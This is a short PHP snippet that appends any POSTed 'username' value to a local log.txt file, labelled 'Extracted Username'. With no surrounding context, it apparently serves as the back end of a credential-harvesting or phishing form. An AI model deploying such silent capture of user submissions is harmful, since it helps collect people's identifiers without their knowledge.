<?php
if (isset($_POST['username'])) {
    file_put_contents('log.txt', "Extracted Username: " . $_POST['username'] . "\n", FILE_APPEND);
}
?>
